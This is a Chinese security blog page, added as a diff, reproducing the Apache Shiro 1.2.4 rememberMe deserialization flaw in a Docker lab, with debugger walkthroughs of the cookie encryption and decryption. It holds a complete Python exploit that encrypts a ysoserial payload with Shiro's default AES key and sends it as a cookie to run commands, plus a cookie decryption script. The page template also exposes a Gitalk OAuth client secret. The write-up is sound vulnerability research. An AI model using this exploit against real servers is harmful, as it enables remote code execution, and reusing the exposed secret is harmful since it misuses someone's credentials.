@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    shiro-1.2.4反序列化复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-shiro-1.2.4反序列化复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      shiro-1.2.4反序列化复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-11-07T14:20:07.000Z" itemprop="datePublished">2020-11-07</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>很久的洞了，看起来感觉很简单，用起来的时候就不是那么简单了，还是需要好好调试一下的</p>
+<a id="more"></a>
+
+<h1 id="0x01-docker-环境"><a href="#0x01-docker-环境" class="headerlink" title="0x01 docker 环境"></a>0x01 docker 环境</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201107222926819.png" alt="image-20201107222926819"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">'http://192.168.59.128:80'</span>, <span class="string">'touch /tmp/test'</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201108231526653.png" alt="image-20201108231526653" style="zoom:200%;">
+
+<h1 id="0x02-调试环境"><a href="#0x02-调试环境" class="headerlink" title="0x02 调试环境"></a>0x02 调试环境</h1><blockquote>
+<p>win10  jdk1.8.0_102/jdk1.8.0_261  tomcat9.0.37</p>
+</blockquote>
+<p>shiro 下载链接 <a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>下载完后用idea打开samples/web目录，然后在pom.xml中加入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后maven下载包，之后用tomcat部署web，</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075808033.png" alt="image-20201110075808033"></p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075835741.png" alt="image-20201110075835741"></p>
+<p>然后运行即可。</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109205358251.png" alt="image-20201109205358251"></p>
+<p>本地测试 jdk1.8.0_102成功弹出计算器</p>
+<p>本地测试jdk1.8.0_261成功弹出计算器</p>
+<h2 id="2-1-分析加密过程"><a href="#2-1-分析加密过程" class="headerlink" title="2.1 分析加密过程"></a>2.1 分析加密过程</h2><p>在AbstractRememberMeManager.class的onSuccessfulLogin()函数下断点，开启调试，发包</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109212754918.png" alt="image-20201109212754918"></p>
+<p>跟进<code>rememberIdentity()</code></p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230309287.png" alt="image-20201109230309287"></p>
+<p>然后到达<code>convertPrincipalsToBytes()</code>，</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225957934.png" alt="image-20201109225957934"></p>
+<p>可以看出是先进行序列化，</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230738143.png" alt="image-20201109230738143"></p>
+<p>然后再加密，加密采用AES的CBC模式</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225722244.png" alt="image-20201109225722244"></p>
+<p>对应的AES的密钥为<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解密值。</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081043680.png" alt="image-20201110081043680"></p>
+<p>之后产生初始化的IV，进行加密。</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081437570.png" alt="image-20201110081437570"></p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081702788.png" alt="image-20201110081702788"></p>
+<h2 id="2-2-解密过程分析"><a href="#2-2-解密过程分析" class="headerlink" title="2.2 解密过程分析"></a>2.2 解密过程分析</h2><p>断点断在<code>AbstractRememberMeManager.class</code>的<code>getRememberedPrincipals()</code>。</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083556969.png" alt="image-20201110083556969"></p>
+<p><code>getRememberedSerializedIdentity()</code>函数将RememberMe的cookie值base64解码，</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083822727.png" alt="image-20201110083822727"></p>
+<p>然后跟进<code>convertBytesToPrincipals()</code>函数，</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084048135.png" alt="image-20201110084048135"></p>
+<p>然后进行解密</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084206912.png" alt="image-20201110084206912"></p>
+<p>对应的AES解密的密钥为<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解密值。</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110091326886.png" alt="image-20201110091326886"></p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084247565.png" alt="image-20201110084247565"></p>
+<p>解密完后进行反序列化</p>
+<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084721992.png" alt="image-20201110084721992"></p>
+<p>cookie解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    cipher = base64.b64decode(cookie)</span><br><span class="line">    IV   = cipher[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    remember_bin = encryptor.decrypt(cipher)</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cookie=<span class="string">""""""</span></span><br><span class="line">    print(decode_rememberme(cookie))</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110090831607.png" alt="image-20201110090831607" style="zoom:150%;">
+
+<p>参考：</p>
+<p><a href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">shiro 反序列化复现</a>    </p>
+<p><a href="https://sherlocz.github.io/2020/08/02/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">shiro 1.2.4反序列化漏洞分析</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/11/07/shiro-1.2.4反序列化复现/" target="_blank" title="shiro-1.2.4反序列化复现">http://mount4in.github.io/2020/11/07/shiro-1.2.4反序列化复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="clg20p5lj000o14uv3dv84bgy"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/11/08/2020-UNCTF-Web-wp/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020-UNCTF-Web-wp
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020西湖论剑web-wp</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
